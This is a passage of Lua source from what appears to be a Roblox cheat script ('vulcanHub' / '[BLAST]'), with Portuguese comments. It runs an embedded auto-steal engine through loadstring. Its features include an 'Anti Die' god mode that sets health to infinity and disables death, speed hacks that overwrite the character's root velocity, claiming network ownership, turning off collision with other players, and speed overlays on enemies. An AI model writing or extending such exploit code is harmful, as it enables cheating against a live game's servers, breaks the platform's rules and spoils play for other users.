        if _rsConn then pcall(function() _rsConn:Disconnect() end) _rsConn = nil end
        pcall(function() _rsWatchSelfMedusa(char) end)
        _rsWasRagdolled = false
        _rsWindow = nil
        _rsLastTrigger = 0
        _rsClearSince = 0
        _rsLockUntil = 0
        _rsConn = RunService.Heartbeat:Connect(function()
            if not State.syncAfterHitToggle then
                _rsWasRagdolled = false
                _rsLockUntil = 0
                if _rsWindow then _rsRestoreAutoGrab() end
                return
            end
            local hum = char and char.Parent and char:FindFirstChildOfClass("Humanoid")
            if not hum then return end
            local med = _rsIsMedusad()
            local rag = med or _rsHitDetected(hum)
            local nowc = os.clock()
            -- debounce: o estado precisa ficar limpo ~0.35s antes de rearmar,
            -- senao um unico golpe seria contado duas vezes.
            if rag then
                _rsClearSince = 0
            else
                if _rsClearSince == 0 then _rsClearSince = nowc end
                if (nowc - _rsClearSince) < 0.6 then
                    rag = _rsWasRagdolled
                end
            end
            -- enquanto o golpe atual esta travado, o estado conta como continuo:
            -- qualquer piscada do ragdoll NAO pode gerar uma segunda deteccao.
            if nowc < _rsLockUntil then
                rag = true
            elseif not rag then
                _rsLockUntil = 0
            end
            if rag and not _rsWasRagdolled and nowc >= _rsLockUntil and (nowc - _rsLastTrigger) >= RS_COOLDOWN then
                _rsLastTrigger = nowc
                local kind = med and "medusa" or _rsClassifyHit()
                local cfg = RAG_CFG[kind]
                -- trava o rearme por toda a duracao do golpe (1 hit = 1 deteccao)
                _rsLockUntil = nowc + math.max(cfg.timer or 0, cfg.reenable or 0) + 0.5
                _rsHitKind = kind
                _rsHitAt = os.clock()
                -- Ragdoll Steal agora SO age no golpe de MORCEGO (medusa removida)
                if State.syncAfterHitToggle and kind == "bat" and selectedStealMode == "Semi" and autoStealEnabled then
                    if autoStealEnabled and _rsWindow == nil then
                        _rsPrevAutoGrab = true
                        _G._K7AutoGrabPauseUntil = os.clock() + cfg.reenable
                        -- Set the window before stopping to prevent re-entrant starts.
                        _rsWindow = {t0 = os.clock(), reenable = cfg.reenable}
                        if selectedStealMode == "Semi" then
                            if _G.AmbitiousSemiAutoStealStop then pcall(_G.AmbitiousSemiAutoStealStop) end
                            if _G.AmbitiousSemiV2AutoStealStop then pcall(_G.AmbitiousSemiV2AutoStealStop) end
                        end
                    end
                    _rsWindow = { t0 = os.clock(), reenable = cfg.reenable, kind = kind }
                    -- rede de seguranca: mesmo se o Heartbeat falhar, volta no tempo
                    _rsGuard = (_rsGuard or 0) + 1
                    local g = _rsGuard
                    task.delay(cfg.reenable + 0.05, function()
                        if g == _rsGuard and _rsWindow then _rsRestoreAutoGrab() end
                    end)
                end
            elseif rag and _rsHitKind == "bat" and med and (nowc - (_rsHitAt or 0)) < RS_COOLDOWN then
                -- upgrade: Medusa confirmada logo apos o hit
                local elapsed = os.clock() - (_rsHitAt or os.clock())
                _rsHitKind = "medusa"
                -- Medusa nao pausa mais o Auto Grab: libera a janela na hora
                if _rsWindow then _rsRestoreAutoGrab() end
            end
            _rsWasRagdolled = rag
            if _rsWindow and (os.clock() - _rsWindow.t0) >= _rsWindow.reenable then
                _rsRestoreAutoGrab()
            end
        end)
    end

    -- trava extra: o Semi (Auto Grab V2) tambem respeita a janela de bloqueio.
    -- A janela EXPIRA sozinha: nunca pode deixar o Auto Grab preso em 0%.
    _G.RagdollStealReady = function()
        if selectedStealMode ~= "Semi" then return true end
        if not State.syncAfterHitToggle then
            if _rsWindow then _rsRestoreAutoGrab() end
            return true
        end
        if _rsWindow == nil then return true end
        if (os.clock() - _rsWindow.t0) >= (_rsWindow.reenable or 1.5) then
            _rsRestoreAutoGrab()
            return true
        end
        return false
    end

    -- WATCHDOG: destrava o Auto Grab caso a janela fique presa por qualquer bug
    task.spawn(function()
        while true do
            task.wait(0.25)
            pcall(function()
                if _rsWindow and (os.clock() - _rsWindow.t0) >= ((_rsWindow.reenable or 1.5) + 0.3) then
                    _rsRestoreAutoGrab()
                end
                if (not State.syncAfterHitToggle) and _rsWindow then
                    _rsRestoreAutoGrab()
                end
            end)
        end
    end)

    _G.SyncAfterHitReady = _G.RagdollStealReady
    _G._K7SyncAfterHitClear = function() _rsRestoreAutoGrab() end
    _G._K7RagdollStealClear = _G._K7SyncAfterHitClear
    _G._startSyncAfterHitWatcher = function() startRagdollSystems(LP.Character) end
    _G._stopSyncAfterHitWatcher = function()
        _rsRestoreAutoGrab()
        if _rsConn then _rsConn:Disconnect(); _rsConn = nil end
        for _, conn in ipairs(_rsSelfMedusaConns) do pcall(function() conn:Disconnect() end) end
        _rsSelfMedusaConns = {}
    end
    _G._VLESSVSApplySyncAfterHit = function()
        State.syncAfterHitEnabled = State.syncAfterHitToggle == true
        if State.syncAfterHitEnabled then
            if not _rsConn then startRagdollSystems(LP.Character) end
        else
            _G._stopSyncAfterHitWatcher()
        end
    end
    LP.CharacterAdded:Connect(function(char)
        _rsWindow = nil
        _G._K7AutoGrabPauseUntil = nil
        if State.syncAfterHitToggle then startRagdollSystems(char) end
        task.delay(0.5, function()
            if LP.Character == char and autoStealEnabled then pcall(_G.AmbitiousAutoStealSync) end
        end)
    end)
    _G._VLESSVSApplySyncAfterHit()
    -- Keep Auto Grab armed continuously, including while carrying a Pet.
    -- The user's toggle never changes here: only an active Ragdoll Steal window
    -- may pause the engine, and the selected mode is restored as soon as it ends.
    task.spawn(function()
        while true do
            task.wait(0.2)
            if autoStealEnabled and _G.RagdollStealReady() then
                local engine
                if selectedStealMode == "Normal" then
                    engine = _G.AmbitiousNormalSteal
                elseif selectedSemiMode == "V2" then
                    engine = _G.AmbitiousSemiV2Steal
                else
                    engine = _G.VLESSVSMysteryV1
                end
                local connection = engine and (engine.conn or engine.stealConn)
                if engine and (not engine.enabled or not connection or not connection.Connected) then
                    pcall(_G.AmbitiousAutoStealSync)
                end
            end
        end
    end)
    _G._K7StartRagdollSystems = startRagdollSystems
    end


_G.AmbitiousAutoStealReady = true


]]
    local loader = loadstring or load
    local fn, err = loader(_src)
    if not fn then
        warn("[BLAST] AutoSteal load error:", err)
    else
        -- Share chunk globals so LP / selectedStealMode resolve
        pcall(function()
            if setfenv then setfenv(fn, getfenv and getfenv() or _G) end
        end)
        local ok, err2 = pcall(fn)
        if not ok then
            warn("[BLAST] AutoSteal init error:", err2)
        else
            print("[BLAST] Ambitious AutoSteal engines loaded (Normal/Semi/SemiV2)")
        end
    end
    _G.autoStealEnabled = autoStealEnabled == true
    _G.selectedStealMode = selectedStealMode or "Normal"
    _G.selectedSemiMode = selectedSemiMode or "V1"
    _G.autoStealRadius = tonumber(autoStealRadius) or 70
end

-- start/stop wired to Ambitious sync
startAutoSteal = function()
    autoStealEnabled = true
    State.autoStealEnabled = true
    Steal.AutoStealEnabled = true
    _G.autoStealEnabled = true
    if _G.StealBar and _G.StealBar.SetEnabled then _G.StealBar.SetEnabled(true) end
    if type(_G.AmbitiousAutoStealSync) == "function" then
        pcall(_G.AmbitiousAutoStealSync)
    end
    if _G.StealBar and _G.StealBar.SetEnabled then pcall(_G.StealBar.SetEnabled, true) end
end
stopAutoSteal = function()
    autoStealEnabled = false
    State.autoStealEnabled = false
    Steal.AutoStealEnabled = false
    _G.autoStealEnabled = false
    if _G.StealBar and _G.StealBar.SetEnabled then _G.StealBar.SetEnabled(false); _G.StealBar.Reset() end
    if type(_G.AmbitiousAutoStealSync) == "function" then
        pcall(_G.AmbitiousAutoStealSync)
    end
    if _G.AmbitiousNormalAutoStealStop then pcall(_G.AmbitiousNormalAutoStealStop) end
    if _G.AmbitiousSemiAutoStealStop then pcall(_G.AmbitiousSemiAutoStealStop) end
    if _G.AmbitiousSemiV2AutoStealStop then pcall(_G.AmbitiousSemiV2AutoStealStop) end
    if _G.StealBar and _G.StealBar.SetEnabled then pcall(_G.StealBar.SetEnabled, false) end
    if _G.StealBar and _G.StealBar.Reset then pcall(_G.StealBar.Reset) end
end




local CONFIG_FILE = "vulcanHubConfig.json"
local Conns={autoSteal=nil,antiRag=nil,aimbot=nil,anchor={},progress=nil,batCounter=nil,unwalk=nil,noCollideLoop=nil,antiMedusa=nil,input=nil}

-- Cleanup old connections from previous script runs
if _G.NoxyConnections then
    for _, conn in pairs(_G.NoxyConnections) do
        pcall(function() conn:Disconnect() end)
    end
end
_G.NoxyConnections = {}
local function trackConn(c) table.insert(_G.NoxyConnections, c); return c end

-- ============================================================
-- ANTI DIE (sistema do Anti die fix)
-- ============================================================
_G.BlastAntiDie = _G.BlastAntiDie or {humanoid = nil, connections = {}, heartConn = nil, charAddedConn = nil}

function _G.BlastAntiDieDisconnectCharacter()
    for _, connection in ipairs(_G.BlastAntiDie.connections or {}) do
        pcall(function() connection:Disconnect() end)
    end
    _G.BlastAntiDie.connections = {}
    if _G.BlastAntiDie.heartConn then
        pcall(function() _G.BlastAntiDie.heartConn:Disconnect() end)
        _G.BlastAntiDie.heartConn = nil
    end
end

function _G.BlastAntiDieProtectCharacter(character)
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 5)
    _G.BlastAntiDie.humanoid = humanoid
    if not humanoid then return end

    pcall(function()
        humanoid.MaxHealth = math.huge
        humanoid.Health = math.huge
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
    end)

    local stateConn = humanoid.StateChanged:Connect(function(_, newState)
        if not State.antiDieEnabled then return end
        if newState == Enum.HumanoidStateType.Dead then
            pcall(function()
                humanoid.Health = math.huge
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
            end)
        end
    end)
    local healthConn = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
        if not State.antiDieEnabled then return end
        if humanoid.Health < humanoid.MaxHealth then
            pcall(function() humanoid.Health = math.huge end)
        end
    end)
    table.insert(_G.BlastAntiDie.connections, stateConn)
    table.insert(_G.BlastAntiDie.connections, healthConn)
    trackConn(stateConn)
    trackConn(healthConn)

    if _G.BlastAntiDie.heartConn then
        pcall(function() _G.BlastAntiDie.heartConn:Disconnect() end)
    end
    _G.BlastAntiDie.heartConn = RunService.Heartbeat:Connect(function()
        if not State.antiDieEnabled then return end
        if humanoid and humanoid.Parent and humanoid.Health < humanoid.MaxHealth then
            pcall(function() humanoid.Health = math.huge end)
        end
    end)
    trackConn(_G.BlastAntiDie.heartConn)
end

function _G.BlastSetAntiDie(on)
    State.antiDieEnabled = on == true
    _G.BlastAntiDieOn = State.antiDieEnabled
    if _G.BlastAntiDie.charAddedConn then
        pcall(function() _G.BlastAntiDie.charAddedConn:Disconnect() end)
        _G.BlastAntiDie.charAddedConn = nil
    end
    _G.BlastAntiDieDisconnectCharacter()
    if State.antiDieEnabled then
        _G.BlastAntiDieProtectCharacter(LP.Character)
        _G.BlastAntiDie.charAddedConn = LP.CharacterAdded:Connect(function(character)
            if not State.antiDieEnabled then return end
            task.wait(0.1)
            _G.BlastAntiDieDisconnectCharacter()
            _G.BlastAntiDieProtectCharacter(character)
        end)
        trackConn(_G.BlastAntiDie.charAddedConn)
    else
        local character = LP.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            pcall(function()
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
                humanoid.MaxHealth = 100
                humanoid.Health = 100
            end)
        end
    end
end

_G.BlastToggleAntiDie = function()
    _G.BlastSetAntiDie(not State.antiDieEnabled)
end
local MEDUSA_COOLDOWN=25
local DROP = {
    active = false,
    lastTime = 0,
    conns = {},
    _conn = nil,
    ascendDuration = 0.22,
    ascendSpeed = 160,
    setVisual = nil,
    mobSet = nil,
}
local isTouchEnabled = UIS.TouchEnabled
local duelLaggerWaitTime = isTouchEnabled and 5.8 or 0.25
local h,hrp
local keybindBtnRefs={}
local toggleRefs={}
local activeKeybindListener = nil -- Track active keybind listener
local activeKeybindBtn = nil
local activeKeybindKeyRef = nil

local progressPct,progressFill -- Steal progress bar UI refs

-- Custom Font Variables
local _vynxFontMyfont = nil
local _vynxFontBadfont = nil
local _vynxFontOriginals = {}
local _vynxFontEnabled = false
local _vynxFontConn = nil

-- Forward reference for mobile buttons
local mobileButtons = {}
local mobileButtonsGui = nil
local mobileLaggerVisualMode = nil -- "lagger" ou "carryLagger"

-- Shared callbacks for the Keybinds tab, keyboard and gamepad.
_G.EmbeerKeybinds = {buttons = {}, rows = {}, suppressedUntil = 0, tpDownActive = false}

-- Forward declare SPD (locals inside do do not count toward main-chunk 200 limit)
local SPD
do
-- ============================================================
-- ============================================================
-- SPEED SYSTEM (Ported from Mystery.Vs / Ambitious Root Velocity)
-- Substituição completa: Normal Speed, Carry Mode, Lagger Mode, Lagger Carry
-- Motor: Ambitious Root Velocity (root.Velocity X/Z com preservação do Y)
-- ============================================================
local _tick = tick
local _clamp = math.clamp
local _floor = math.floor
local _sqrt = math.sqrt
local _huge = math.huge
local _V3new = Vector3.new
local _V3zero = Vector3.zero
local _CFnew = CFrame.new

-- Valores padrão do Mystery
local NS = 59.5
local CS = 28.8
local LAGGER_SPEED = 29
local LAGGER_CARRY_SPEED = 15

local CarrySystem = {
    normalSpeed = NS,
    carrySpeed = CS,
    laggerSpeed = LAGGER_SPEED,
    laggerCarrySpeed = LAGGER_CARRY_SPEED,

    speedToggled = false,
    laggerMode = 0,

    softStealEnabled = false,
    softStealRadius = 10,
    softStealSpeed = 30,
    softStealLatched = false,

    _isCarrying = false,
    _lastCarryCheck = 0,

    _heartbeatConn = nil,
    _renderSteppedConn = nil,
    _softStealScanner = nil,
    _softStealAnimals = {},
    _softStealScanning = false,

    _state = nil,
    _dropInProgress = false,
    _batAimbotToggled = false,
    _speedEnabled = false,
}

local function removeLegacySpeedMover(char)
    char = char or LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    pcall(function()
        local lv = hrp:FindFirstChild("CarryBoostLV") or hrp:FindFirstChild("AdaptHorizontalSpeed") or hrp:FindFirstChild("MuzanBoostLV")
        if lv then lv:Destroy() end
        local att = hrp:FindFirstChild("AdaptSpeedAttachment")
        if att then att:Destroy() end
    end)
end

local function claimOwnership(root)
    pcall(function() root:SetNetworkOwner(LP) end)
end

function CarrySystem:isCarrying()
    local now = _tick()
    if now - (self._lastCarryCheck or 0) < 0.1 then
        return self._isCarrying
    end
    self._lastCarryCheck = now
    local char = LP.Character
    if not char then self._isCarrying = false; return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local ws = hum and hum.WalkSpeed or 16
    local bySpeed = (ws < 25 and ws > 0)
    local byAttr = false
    local ok, v = pcall(function() return LP:GetAttribute("Stealing") end)
    if ok and v == true then byAttr = true end
    local ok2, v2 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok2 and v2 == true then byAttr = true end
    if not byAttr then
        for _, name in ipairs({"Carrying","IsCarrying","Grabbed","Holding","StealHold","HasGrab"}) do
            local obj = char:FindFirstChild(name)
            if obj then
                if (obj:IsA("BoolValue") and obj.Value) or
                   (obj:IsA("ObjectValue") and obj.Value) or
                   (obj:IsA("StringValue") and obj.Value ~= "") then
                    byAttr = true; break
                end
            end
        end
    end
    self._isCarrying = bySpeed or byAttr
    return self._isCarrying
end

function CarrySystem:getActiveSpeed()
    if self._state and (self._state.autoLeftEnabled or self._state.autoRightEnabled) then
        return self.normalSpeed or 59.5
    end
    if self.softStealEnabled then
        local _, dist = self:getNearestSoftStealAnimal(self.softStealRadius)
        local inRange = dist and dist <= self.softStealRadius
        if inRange then
            self.softStealLatched = true
            return self.softStealSpeed or 30
        end
        if self.softStealLatched and self:isCarrying() then
            return self.softStealSpeed or 30
        else
            self.softStealLatched = false
        end
    end
    if self.laggerMode == 1 then return self.laggerSpeed or 29 end
    if self.laggerMode == 2 then return self.laggerCarrySpeed or 15 end
    if self.speedToggled then return self.carrySpeed or 28.8 end
    return self.normalSpeed or 59.5
end

function CarrySystem:getStatus()
    if self._state and (self._state.autoLeftEnabled or self._state.autoRightEnabled) then
        return "Normal", self.normalSpeed or 59.5
    end
    if self.softStealEnabled then
        local _, dist = self:getNearestSoftStealAnimal(self.softStealRadius)
        local inRange = dist and dist <= self.softStealRadius
        if inRange or (self.softStealLatched and self:isCarrying()) then
            return "Auto Carry", self.softStealSpeed or 30
        end
    end
    if self.laggerMode == 1 then return "Lagger", self.laggerSpeed or 29 end
    if self.laggerMode == 2 then return "Lagger Carry", self.laggerCarrySpeed or 15 end
    if self.speedToggled then return "Carry", self.carrySpeed or 28.8 end
    return "Normal", self.normalSpeed or 59.5
end

function CarrySystem:scanSoftStealAnimals()
    self._softStealAnimals = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return end
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            local podiums = plot:FindFirstChild("AnimalPodiums")
            if podiums then
                for _, podium in ipairs(podiums:GetChildren()) do
                    if podium:IsA("Model") then
                        local base = podium:FindFirstChild("Base")
                        local spawn = base and base:FindFirstChild("Spawn")
                        if spawn then
                            table.insert(self._softStealAnimals, {
                                plot = plot.Name,
                                slot = podium.Name,
                                worldPosition = spawn.Position,
                                uid = plot.Name .. "_" .. podium.Name,
                            })
                        end
                    end
                end
            end
        end
    end
end

function CarrySystem:startSoftStealScanner()
    if self._softStealScanner then return end
    self._softStealScanning = true
    self:scanSoftStealAnimals()
    self._softStealScanner = RunService.Heartbeat:Connect(function()
        if not self._softStealScanning then return end
        self:scanSoftStealAnimals()
    end)
end

function CarrySystem:stopSoftStealScanner()
    self._softStealScanning = false
    if self._softStealScanner then
        self._softStealScanner:Disconnect()
        self._softStealScanner = nil
    end
end

function CarrySystem:getNearestSoftStealAnimal(radius)
    local char = LP.Character
    local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
    if not root then return nil, _huge end
    local best, bestDist = nil, _huge
    local animals = self._softStealAnimals
    local rpos = root.Position
    for i = 1, #animals do
        local data = animals[i]
        if data.worldPosition then
            local dx = rpos.X - data.worldPosition.X
            local dy = rpos.Y - data.worldPosition.Y
            local dz = rpos.Z - data.worldPosition.Z
            local dist = _sqrt(dx*dx + dy*dy + dz*dz)
            if dist < bestDist then
                best = data; bestDist = dist
            end
        end
    end
    if radius and bestDist > radius then return nil, bestDist end
    return best, bestDist
end

local function noCollideCarried()
    local char = LP.Character
    if not char then return end
    for _, model in ipairs(char:GetChildren()) do
        if model:IsA("Model") then
            for _, part in ipairs(model:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = false end
            end
        end
    end
    for _, name in ipairs({"Carrying","IsCarrying","Grabbed","Holding","StealHold","HasGrab"}) do
        local v = char:FindFirstChild(name)
        if v and v:IsA("ObjectValue") and v.Value and v.Value:IsA("Model") then
            for _, part in ipairs(v.Value:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = false end
            end
        end
    end
end

local function speedEngineBlocked()
    return (DROP and DROP.active) or (State and (State._dropInProgress or State._tpInProgress))
end

local function aimbotMovementActive()
    return (State and State.batAimbotToggled == true)
        or _G.AceNormalAimbotOn == true
        or _G.AceAntiDesyncAimbotOn == true
        or _G.AceBatV2Active == true
end

function CarrySystem:updateMovement()
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root or not root.Parent then
        _G._AmbitiousAntiBatDesiredXZ = nil
        return
    end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health <= 0 then
        _G._AmbitiousAntiBatDesiredXZ = nil
        return
    end

    if speedEngineBlocked() then
        if self._speedEnabled then
            self._speedEnabled = false
            pcall(function()
                if humanoid then
                    humanoid.AutoRotate = true
                    if humanoid.WalkSpeed ~= 16 then humanoid.WalkSpeed = 16 end
                end
            end)
        end
        _G._AmbitiousAntiBatDesiredXZ = nil
        return
    end

    local state = humanoid:GetState()
    if humanoid.PlatformStand
        or state == Enum.HumanoidStateType.Physics
        or state == Enum.HumanoidStateType.Ragdoll
        or state == Enum.HumanoidStateType.FallingDown then
        self._speedEnabled = false
        _G._AmbitiousAntiBatDesiredXZ = nil
        return
    end

    if aimbotMovementActive() then
        self._speedEnabled = false
        _G._AmbitiousAntiBatDesiredXZ = nil
        return
    end

    local md = humanoid.MoveDirection
    local spd = self:getActiveSpeed()
    if not spd or spd <= 0 then
        _G._AmbitiousAntiBatDesiredXZ = nil
        return
    end

    if not self._speedEnabled then
        self._speedEnabled = true
        claimOwnership(root)
    end

    local autoLeft = self._state and self._state.autoLeftEnabled
    local autoRight = self._state and self._state.autoRightEnabled

    if not autoLeft and not autoRight and md.Magnitude > 0 then
        noCollideCarried()
        if _G._AmbitiousZigZagFalling then
            _G._AmbitiousAntiBatDesiredXZ = nil
        else
            _G._AmbitiousAntiBatDesiredXZ = Vector3.new(md.X * spd, 0, md.Z * spd)
        end
        if not _G._AmbitiousAntiBatSpiking and not _G._AmbitiousZigZagFalling then
            local curVel = root.Velocity
            root.Velocity = Vector3.new(md.X * spd, curVel.Y, md.Z * spd)
        end
    end

    if md.Magnitude <= 0 or autoLeft or autoRight then
        _G._AmbitiousAntiBatDesiredXZ = nil
    end
end

function CarrySystem:start()
    if not self._heartbeatConn then
        removeLegacySpeedMover()
        self._heartbeatConn = RunService.Heartbeat:Connect(function()
            self:updateMovement()
        end)
    end
    if not self._renderSteppedConn then
        local _camGuardNext = 0
        self._renderSteppedConn = RunService.RenderStepped:Connect(function()
            local now = os.clock()
            if now < _camGuardNext then return end
            _camGuardNext = now + 0.5

            local cam = workspace.CurrentCamera
            if not cam then return end
            if (self._state and (self._state.freeCamEnabled or self._state._tpInProgress)) then return end
            local char = LP.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if not hum or hum.Health <= 0 then return end

            pcall(function()
                if cam.CameraSubject ~= hum then
                    cam.CameraSubject = hum
                end
            end)
        end)
    end
    if self.softStealEnabled then self:startSoftStealScanner() end
end

function CarrySystem:stop()
    if self._heartbeatConn then
        self._heartbeatConn:Disconnect()
        self._heartbeatConn = nil
    end
    if self._renderSteppedConn then
        self._renderSteppedConn:Disconnect()
        self._renderSteppedConn = nil
    end
    self:stopSoftStealScanner()
    removeLegacySpeedMover()
    self._speedEnabled = false
    self.softStealLatched = false
    _G._AmbitiousAntiBatDesiredXZ = nil
end

function CarrySystem:setNormalSpeed(v) self.normalSpeed = _clamp(tonumber(v) or 59.5, 1, 500) end
function CarrySystem:setCarrySpeed(v) self.carrySpeed = _clamp(tonumber(v) or 28.8, 1, 500) end
function CarrySystem:setLaggerSpeed(v) self.laggerSpeed = _clamp(tonumber(v) or 29, 0.1, 500) end
function CarrySystem:setLaggerCarrySpeed(v) self.laggerCarrySpeed = _clamp(tonumber(v) or 15, 0.1, 500) end
function CarrySystem:setSoftStealSpeed(v) self.softStealSpeed = _clamp(tonumber(v) or 30, 1, 500) end
function CarrySystem:setSoftStealRadius(v) self.softStealRadius = _clamp(tonumber(v) or 10, 1, 200) end

function CarrySystem:toggleCarryMode()
    self.speedToggled = not self.speedToggled
    if self.speedToggled and self.laggerMode ~= 0 then
        self.laggerMode = 0
    end
end

function CarrySystem:setLaggerMode(mode)
    if self.laggerMode == mode then return end
    self.laggerMode = mode
    if mode ~= 0 and self.speedToggled then
        self.speedToggled = false
    end
end

function CarrySystem:toggleLaggerMode()
    if self.laggerMode == 0 then
        self:setLaggerMode(2)
    elseif self.laggerMode == 2 then
        self:setLaggerMode(1)
    else
        self:setLaggerMode(2)
    end
end

function CarrySystem:setSoftStealEnabled(enabled)
    self.softStealEnabled = enabled
    if enabled then self:startSoftStealScanner()
    else self:stopSoftStealScanner(); self.softStealLatched = false end
end
function CarrySystem:isRunning() return self._heartbeatConn ~= nil end
function CarrySystem:getCurrentSpeed() return self:getActiveSpeed() end

-- SPD facade (keeps UI / keybinds / mobile / config working)
SPD = {
    speedLabel = nil,
    modeValLbl = nil,
    mobSetCarry = nil,
    mobSetLagger1 = nil,
    mobSetLagger2 = nil,
    forceSpeedUntil = 0,
    antiDropEnabled = false,
}

setmetatable(SPD, {
    __index = function(t, k)
        if k == "NS" then return CarrySystem.normalSpeed end
        if k == "CS" then return CarrySystem.carrySpeed end
        if k == "LAGGER_SPEED" or k == "LAGGER_SPEED_1" then return CarrySystem.laggerSpeed end
        if k == "LAGGER_CARRY_SPEED" or k == "LAGGER_SPEED_2" then return CarrySystem.laggerCarrySpeed end
        if k == "speedMode" then return CarrySystem.speedToggled == true end
        if k == "laggerToggled" then return CarrySystem.laggerMode ~= 0 end
        if k == "laggerLevel" then
            if CarrySystem.laggerMode == 2 then return 2 end
            return 1
        end
        return rawget(t, k)
    end,
    __newindex = function(t, k, v)
        if k == "NS" then CarrySystem:setNormalSpeed(v); return end
        if k == "CS" then CarrySystem:setCarrySpeed(v); return end
        if k == "LAGGER_SPEED" or k == "LAGGER_SPEED_1" then CarrySystem:setLaggerSpeed(v); return end
        if k == "LAGGER_CARRY_SPEED" or k == "LAGGER_SPEED_2" then CarrySystem:setLaggerCarrySpeed(v); return end
        if k == "speedMode" then
            CarrySystem.speedToggled = (v == true)
            if CarrySystem.speedToggled then CarrySystem.laggerMode = 0 end
            return
        end
        if k == "laggerToggled" then
            if v then
                if CarrySystem.laggerMode == 0 then CarrySystem:setLaggerMode(1) end
            else
                CarrySystem:setLaggerMode(0)
            end
            return
        end
        if k == "laggerLevel" then
            local n = tonumber(v) or 1
            if CarrySystem.laggerMode ~= 0 then
                CarrySystem:setLaggerMode((n >= 2) and 2 or 1)
            end
            return
        end
        rawset(t, k, v)
    end,
})

local enemySpeedLabels = {}
local enemySpeedConn = nil
local steppedConn = nil

local function getActiveMoveSpeed()
    return CarrySystem:getActiveSpeed()
end

local function refreshSpeedModeLabel()
    if SPD.modeValLbl then
        local mode = select(1, CarrySystem:getStatus())
        SPD.modeValLbl.Text = mode
    end
end

local function resetMovementState()
    refreshSpeedModeLabel()
    local lm = CarrySystem.laggerMode
    local st = CarrySystem.speedToggled
    if lm == 0 then mobileLaggerVisualMode = nil
    elseif lm == 2 then mobileLaggerVisualMode = "carryLagger"
    else mobileLaggerVisualMode = "lagger" end

    if SPD.mobSetCarry then SPD.mobSetCarry(st and lm == 0) end
    if SPD.mobSetLagger1 then SPD.mobSetLagger1(lm == 2) end
    if SPD.mobSetLagger2 then SPD.mobSetLagger2(lm == 1) end
    if mobileButtons then
        if mobileButtons["carry"] then mobileButtons["carry"].setActive(st and lm == 0) end
        if mobileButtons["lagger"] then mobileButtons["lagger"].setActive(lm == 1) end
        if mobileButtons["carryLagger"] then mobileButtons["carryLagger"].setActive(lm == 2) end
    end
end

local function toggleCarryMode()
    CarrySystem:toggleCarryMode()
    resetMovementState()
    task.spawn(saveConfig)
end

local function toggleLaggerCycle()
    CarrySystem:toggleLaggerMode()
    resetMovementState()
    task.spawn(saveConfig)
end

local function setLaggerNormal(on)
    if on then
        CarrySystem:setLaggerMode(1)
    else
        if CarrySystem.laggerMode == 1 then
            CarrySystem:setLaggerMode(0)
        end
    end
    resetMovementState()
    task.spawn(saveConfig)
end

local function setLaggerCarry(on)
    if on then
        CarrySystem:setLaggerMode(2)
    else
        CarrySystem:setLaggerMode(0)
    end
    resetMovementState()
    task.spawn(saveConfig)
end

function SPD.isLaggerNormalOn()
    return CarrySystem.laggerMode == 1
end
function SPD.isLaggerCarryOn()
    return CarrySystem.laggerMode == 2
end

local function updateEnemySpeedLabels()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP and player.Character then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            local head = player.Character:FindFirstChild("Head")
            if hrp and head then
                local velocity = hrp.AssemblyLinearVelocity
                local spd = Vector3.new(velocity.X, 0, velocity.Z).Magnitude
                local label = enemySpeedLabels[player]
                if not label or not label.Parent then
                    pcall(function()
                        local old = head:FindFirstChild("EnemySpeedGui")
                        if old then old:Destroy() end
                        local bb = Instance.new("BillboardGui")
                        bb.Name = "EnemySpeedGui"
                        bb.Size = UDim2.new(0, 80, 0, 24)
                        bb.StudsOffset = Vector3.new(0, 2.6, 0)
                        bb.AlwaysOnTop = true
                        bb.Parent = head
                        local tl = Instance.new("TextLabel", bb)
                        tl.Size = UDim2.fromScale(1, 1)
                        tl.BackgroundTransparency = 1
                        tl.TextColor3 = Color3.fromRGB(255, 200, 230)
                        tl.TextStrokeTransparency = 0.4
                        tl.Font = Enum.Font.GothamBold
                        tl.TextSize = 12
                        tl.Text = "0"
                        tl.Visible = false
                        enemySpeedLabels[player] = tl
                        label = tl
                    end)
                end
                if label then
                    label.Text = string.format("%.0f", spd)
                    label.Visible = label.Text ~= "0"
                end
            end
        else
            if enemySpeedLabels[player] then
                pcall(function()
                    local l = enemySpeedLabels[player]
                    if l and l.Parent and l.Parent.Parent then l.Parent.Parent = nil end
                end)
                enemySpeedLabels[player] = nil
            end
        end
    end
end

local function startEnemySpeed()
    if enemySpeedConn then enemySpeedConn:Disconnect() end
    enemySpeedConn = RunService.Heartbeat:Connect(function()
        updateEnemySpeedLabels()
        if SPD.speedLabel then
            local mode, target = CarrySystem:getStatus()
            SPD.speedLabel.Text = string.format("%s  %.0f", mode, target)
        end
    end)
end

local function cleanupSpeedPhysics()
    CarrySystem:stop()
    pcall(removeLegacySpeedMover)
end

local function setupMovementAndIndicators(char)
    if steppedConn then steppedConn:Disconnect(); steppedConn = nil end
    steppedConn = RunService.Stepped:Connect(function()
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character then
                for _, part in ipairs(p.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        pcall(function() part.CanCollide = false end)
                    end
                end
            end
        end
    end)
    CarrySystem._state = State
    CarrySystem:start()
    startEnemySpeed()
    resetMovementState()
end

SPD.toggleCarryMode = toggleCarryMode
SPD.toggleLaggerCycle = toggleLaggerCycle
